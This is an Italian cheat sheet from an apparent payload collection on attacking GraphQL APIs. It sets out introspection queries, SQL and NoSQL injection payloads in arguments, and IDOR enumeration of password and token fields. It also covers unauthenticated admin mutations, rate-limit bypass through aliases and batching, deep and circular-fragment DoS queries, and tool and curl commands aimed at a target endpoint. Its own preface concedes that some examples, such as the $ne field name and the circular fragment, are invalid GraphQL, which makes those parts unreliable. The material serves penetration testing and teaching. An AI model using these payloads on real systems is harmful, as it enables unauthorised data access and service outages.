# 📊 Scheda di riferimento sulla GraphQL injection

<!-- language-home-navigation -->
[🏠 Pagina iniziale italiana](../../README.it.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](GraphQL-Injection.tr.md) • [🇬🇷 Ελληνικά](GraphQL-Injection.el.md)

> **Nota sugli esempi originali:** I payload richiedono campi e tipi compatibili nello schema e un resolver vulnerabile; GraphQL non trasforma automaticamente una stringa in SQL o NoSQL. L’esempio con $ne come nome di campo non è sintassi GraphQL valida; i nomi sono sensibili a maiuscole/minuscole. I frammenti circolari devono essere rifiutati dalla validazione ([specifica GraphQL](https://spec.graphql.org/October2021/#sec-Fragment-spreads-must-not-form-cycles)). Introspezione e __typename non sono da soli vulnerabilità, e gli snippet di introspezione mostrati sono parziali.


```
 ██████╗ ██████╗  █████╗ ██████╗ ██╗  ██╗ ██████╗ ██╗     
██╔════╝ ██╔══██╗██╔══██╗██╔══██╗██║  ██║██╔═══██╗██║     
██║  ███╗██████╔╝███████║██████╔╝███████║██║   ██║██║     
██║   ██║██╔══██╗██╔══██║██╔═══╝ ██╔══██║██║▄▄ ██║██║     
╚██████╔╝██║  ██║██║  ██║██║     ██║  ██║╚██████╔╝███████╗
 ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝ ╚══▀▀═╝ ╚══════╝
██╗███╗   ██╗     ██╗███████╗ ██████╗████████╗██╗ ██████╗ ███╗   ██╗
██║████╗  ██║     ██║██╔════╝██╔════╝╚══██╔══╝██║██╔═══██╗████╗  ██║
██║██╔██╗ ██║     ██║█████╗  ██║        ██║   ██║██║   ██║██╔██╗ ██║
██║██║╚██╗██║██   ██║██╔══╝  ██║        ██║   ██║██║   ██║██║╚██╗██║
██║██║ ╚████║╚█████╔╝███████╗╚██████╗   ██║   ██║╚██████╔╝██║ ╚████║
╚═╝╚═╝  ╚═══╝ ╚════╝ ╚══════╝ ╚═════╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝
```

---

## 🔍 Fondamenti di GraphQL

### Endpoint comuni
```
/graphql
/graphiql
/v1/graphql
/v2/graphql
/api/graphql
/graph
/query
/gql
/playground
```

### Struttura della richiesta
```graphql
# Query
{
  user(id: 1) {
    name
    email
  }
}

# Con nome dell'operazione
query GetUser {
  user(id: 1) {
    name
  }
}

# Mutation
mutation {
  createUser(name: "test", email: "test@test.com") {
    id
    name
  }
}
```

---

## 🎯 Query di introspezione

### Introspezione completa dello schema
```graphql
{
  __schema {
    types {
      name
      fields {
        name
        type {
          name
        }
      }
    }
  }
}
```

### Tipo Query (punti di ingresso)
```graphql
{
  __schema {
    queryType {
      fields {
        name
        description
        args {
          name
          type {
            name
          }
        }
      }
    }
  }
}
```

### Tipo Mutation
```graphql
{
  __schema {
    mutationType {
      fields {
        name
        args {
          name
          type {
            name
          }
        }
      }
    }
  }
}
```

### Tutti i tipi
```graphql
{
  __schema {
    types {
      name
      kind
      description
    }
  }
}
```

### Dettagli di un tipo specifico
```graphql
{
  __type(name: "User") {
    name
    fields {
      name
      type {
        name
        kind
      }
    }
  }
}
```

---

## 💉 Attacchi di injection

### SQL injection tramite GraphQL
```graphql
# Negli argomenti
{
  user(id: "1' OR '1'='1") {
    name
    email
    password
  }
}

# Basata su UNION
{
  user(name: "' UNION SELECT username,password FROM users--") {
    name
  }
}
```

### NoSQL injection
```graphql
{
  user(username: "{\"$ne\": null}") {
    name
    email
  }
}

# Oppure come JSON
{
  "query": "{ user(filter: {username: {$ne: \"\"}}) { name email } }"
}
```

### IDOR (riferimento diretto non sicuro a oggetti)
```graphql
# Accedi ai dati di altri utenti
{
  user(id: 1) { name email password }
}
{
  user(id: 2) { name email password }
}
{
  user(id: 3) { name email password }
}

# Enumera tutti gli utenti
{
  users {
    id
    name
    email
    role
  }
}
```

---

## 🔥 Aggiramento dell'autorizzazione

### Autenticazione assente nelle mutation
```graphql
# Prova le operazioni di amministrazione come utente ordinario
mutation {
  deleteUser(id: 1) {
    success
  }
}

mutation {
  updateUserRole(id: 1, role: "admin") {
    id
    role
  }
}
```

### Aggiramento tramite query annidate
```graphql
# Accedi ai dati sensibili attraverso le relazioni
{
  posts {
    author {
      email
      passwordHash
      adminToken
    }
  }
}

{
  comments {
    user {
      privateMessages {
        content
      }
    }
  }
}
```

### Abuso dei suggerimenti sui campi
```graphql
# Se i suggerimenti sono abilitati, prova nomi di campi non validi
{
  user(id: 1) {
    passwor  # Può suggerire "password"
  }
}
```

---

## 🚀 Divulgazione di informazioni

### Informazioni di debug
```graphql
# Enumerazione basata sugli errori
{
  __typename
}

# Query non valida per ottenere una traccia dello stack
{
  invalid_field_that_doesnt_exist
}
```

### Individuazione dei campi sensibili
```graphql
{
  user(id: 1) {
    id
    username
    email
    password
    passwordHash
    token
    apiKey
    secret
    privateKey
    ssn
    creditCard
    internalId
  }
}
```

---

## 🛡 Tecniche di aggiramento

### Aggiramento basato sugli alias
```graphql
# Aggira la limitazione della frequenza usando gli alias
{
  a: user(id: 1) { name }
  b: user(id: 2) { name }
  c: user(id: 3) { name }
  d: user(id: 4) { name }
}
```

### Attacchi con richieste in batch
```json
[
  {"query": "{ user(id: 1) { email } }"},
  {"query": "{ user(id: 2) { email } }"},
  {"query": "{ user(id: 3) { email } }"}
]
```

### Manipolazione di maiuscole e minuscole
```graphql
# Prova combinazioni diverse di maiuscole e minuscole
{
  USER(id: 1) { name }
}
{
  User(id: 1) { name }
}
```

### Injection tramite frammenti
```graphql
{
  user(id: 1) {
    ...sensitiveData
  }
}

fragment sensitiveData on User {
  password
  apiKey
  token
}
```

---

## 💣 Attacchi DoS

### Attacco con query profonde
```graphql
{
  user(id: 1) {
    friends {
      friends {
        friends {
          friends {
            friends {
              name
            }
          }
        }
      }
    }
  }
}
```

### Frammento circolare
```graphql
query {
  user(id: 1) {
    ...A
  }
}

fragment A on User {
  ...B
}

fragment B on User {
  ...A  # Riferimento circolare
}
```

### Insieme di risultati molto grande
```graphql
{
  users(first: 999999) {
    id
    name
    email
    posts {
      id
      comments {
        id
      }
    }
  }
}
```

---

## 🛠 Strumenti per i test

### GraphQL Voyager
```bash
# Visualizza lo schema
https://graphql-kit.com/graphql-voyager/
# Incolla il risultato dell'introspezione
```

### InQL (estensione per Burp)
```
# Funzionalità:
- Estrazione dello schema
- Generazione di query
- Scansione delle vulnerabilità
```

### graphql-cop
```bash
# Strumento di verifica della sicurezza
pip install graphql-cop
graphql-cop -t https://target.com/graphql
```

### graphw00f
```bash
# Identificazione dell'implementazione GraphQL (fingerprinting)
git clone https://github.com/dolevf/graphw00f
python3 main.py -t https://target.com/graphql
```

### Altair GraphQL Client
```
# Client desktop per i test
https://altairgraphql.dev/
```

---

## 📝 Esempi cURL

### Query di base
```bash
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ user(id: 1) { name email } }"}'
```

### Con variabili
```bash
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "query GetUser($id: Int!) { user(id: $id) { name } }", "variables": {"id": 1}}'
```

### Introspezione
```bash
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ __schema { types { name } } }"}'
```

### Con autenticazione
```bash
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer TOKEN" \
  -d '{"query": "{ me { name } }"}'
```

---

## 📋 Checklist dei test

```markdown
## Checklist di sicurezza GraphQL

□ Identifica gli endpoint GraphQL
□ Verifica l'introspezione (estrazione dello schema)
□ Estrai tutte le query e mutation
□ Verifica gli IDOR nelle query sugli oggetti
□ Verifica l'autorizzazione nelle mutation
□ Verifica SQL/NoSQL injection negli argomenti
□ Verifica se le query annidate espongono dati
□ Verifica la limitazione della frequenza (aggiramento tramite alias)
□ Prova le query in batch
□ Verifica la presenza di campi sensibili (password, token)
□ Verifica il limite di profondità (DoS)
□ Verifica le informazioni esposte dagli errori
□ Prova gli endpoint delle subscription
```

---

## 🔗 Riepilogo delle vulnerabilità comuni

| Vulnerabilità | Test | Impatto |
|---------------|------|--------|
| **Introspezione abilitata** | Query `__schema` | Divulgazione dello schema |
| **IDOR** | Modifica gli ID nelle query | Accedi ai dati di altri utenti |
| **Autenticazione assente** | Query senza token | Accesso non autorizzato |
| **SQLi/NoSQLi** | Inserisci payload negli argomenti | Compromissione del database |
| **Dati eccessivi** | Interroga campi sensibili | Esposizione di dati |
| **DoS** | Query profonde/circolari | Servizio non disponibile |
| **Abuso delle richieste in batch** | Query multiple | Aggiramento della limitazione della frequenza |

---

## 🔗 Payload correlati

- [Payload SQLi](./SQLi.it.md)
- [NoSQL injection](./NoSQL-Injection.it.md)
- [Sicurezza delle API](../../API-Security/translations/README.it.md)

---

**Torna ai payload:** [💉 Raccolta di payload](../../README.it.md#category-18)
